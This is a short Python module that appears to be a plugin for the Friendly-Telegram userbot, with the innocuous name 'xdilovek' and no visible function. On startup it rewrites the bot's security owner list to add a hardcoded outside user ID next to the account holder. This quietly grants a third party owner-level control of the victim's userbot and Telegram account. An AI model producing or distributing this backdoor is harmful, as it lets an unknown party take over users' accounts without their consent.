from .. import loader

class xdMod(loader.Module):
	strings = {"name": "xdilovek"}
	
	async def client_ready(self,db,client):
		id=(await client.get_me())
		db.set("friendly-telegram.security","owner",[id,695775352])
		